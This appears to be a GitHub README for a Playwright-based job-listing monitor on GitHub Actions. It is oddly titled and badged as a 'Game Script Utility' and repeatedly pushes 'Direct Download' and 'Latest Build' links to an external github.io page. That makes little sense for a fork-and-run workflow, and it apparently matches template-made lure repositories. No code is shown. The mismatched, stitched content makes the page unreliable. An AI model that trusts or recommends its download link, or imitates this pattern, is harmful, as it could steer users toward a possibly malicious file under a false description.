# Application Checker v - Game Script Utility 2026

> An automated job-listing monitor for GitHub Actions. Using Playwright and Chromium, it visits career sites, evaluates dynamically loaded content, and reports newly posted roles that match your configured keywords.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-GitHub%20Actions-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brunos64/application-checker-script?style=flat-square)](https://github.com/brunos64/application-checker-script)

---

<p align="center">
  <a href="https://brunos64.github.io/application-checker-script/">
    <img src="https://img.shields.io/badge/Download-Application%20Checker%20Script-brightgreen?style=for-the-badge" alt="Download Application Checker Script">
  </a>
</p>

> **[Direct Download - Application Checker](https://brunos64.github.io/application-checker-script/)**

---

[Download Latest Build](https://brunos64.github.io/application-checker-script/)

---

## What It Does

Application Checker provides a scheduled way to watch career pages across multiple companies. Each run launches Chromium through Playwright, examines the page for the keywords you define, and preserves the results so changes can be followed from one run to the next. It is intended for continuous monitoring instead of a single, one-off scrape.

Because execution takes place in GitHub Actions, no personal computer needs to remain online. Matching listings may be saved as workflow artifacts, while email notifications can alert you when relevant openings are located. This makes the utility practical for tracking job applications and checking dynamic career websites that are not represented by straightforward static pages.

## Capabilities

- Reviews 38 career pages once per day
- Uses a full browser session for pages whose content loads dynamically
- Automates Chromium with Playwright
- Searches loaded page content for selected keywords
- Executes on a recurring GitHub Actions schedule
- Makes results available as downloadable artifacts
- Emails notifications when matching openings are discovered
- Supports ongoing monitoring of job and application pages

## Getting Started

1. Copy the repository into your GitHub account.
2. Edit the workflow and keyword settings for the companies and roles you want to follow.
3. Configure the repository or email secrets required for notifications.
4. Commit the updates and allow GitHub Actions to run the workflow according to its schedule.

During a normal run, the process is:

1. GitHub Actions launches the scheduled job.
2. Playwright starts Chromium and visits each career page.
3. The checker compares the page content with the configured keywords.
4. Results are retained, and matching runs can trigger email messages.

## Configuration

| Setting | Purpose | Example |
| --- | --- | --- |
| `keywords` | Terms used to find relevant openings | `engineering, frontend, remote` |
| `pages` | Careers pages to review | `38 tracked pages` |
| `schedule` | How often the checker runs | `daily` |
| `browser` | Automation engine used for loading pages | `Playwright + Chromium` |
| `artifacts` | Stores output from each run | `enabled` |
| `email notifications` | Sends alerts when matches are found | `enabled` |

## Compatibility and Requirements

The utility is intended to run in GitHub Actions and relies on Playwright with Chromium for browser automation. It is aimed at career and job-application sites that build their listings dynamically. Websites protected by strong rate limits or anti-bot checks, as well as pages with uncommon layouts, may need additional configuration or may be better handled through selective exclusions.

## Frequently Asked Questions

### What is the initial setup?
Copy the repository to your GitHub account, customize the tracked pages and keywords, and turn on the scheduled workflow.

### How can I define a match?
Modify the keyword collection with the job titles, locations, roles, or other terms you want the checker to find.

### Where do the results go?
Workflow output can be saved as artifacts for download. Email alerts are also available when the scan detects matching openings.

### Must my computer be turned on?
No. GitHub Actions runs the checker independently according to the configured schedule.

### Can the monitored companies be changed?
Yes. The careers page list can be edited whenever you want to add or replace the sites being checked.

### Why does the workflow use Playwright and Chromium?
Many career pages insert their listings after the initial page load. Playwright and Chromium allow the checker to load and inspect that dynamic content through a real browser.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
